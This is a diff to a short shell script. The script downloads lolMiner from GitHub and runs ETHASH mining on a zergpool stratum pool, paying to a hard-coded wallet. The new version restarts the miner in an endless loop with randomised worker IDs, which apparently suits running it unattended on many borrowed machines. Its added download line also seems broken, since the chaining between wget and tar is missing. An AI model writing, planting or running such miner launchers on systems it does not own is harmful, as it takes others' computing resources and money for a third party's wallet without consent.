@@ -1,1 +1,7 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xf lolMiner_v1.31_Lin64.tar.gz && cd 1.31/ && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.na.mine.zergpool.com:9999 -u D5Kwh3gHQF9s6MYTNZ95FKZsT6gfoN7uPw.$(shuf -n 1 -i 1-99999) --ethstratum ETHPROXY
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz tar -xf lolMiner_v1.29_Lin64.tar.gz
+while [ 1 ]; do
+cd 1.29/
+./lolMiner --algo ETHASH --pool ethash.mine.zergpool.com:9999 --user MB4cVupJyUrYj77dQw9iU5ApzTFJGrGiW8.c=LTC,mc=ETH,ID=LOL-MT_RECEH-$(echo $(shuf -i 1-99 -n 1)), --ethstratum ETHPROXY
+sleep 2
+done
+sleep 999
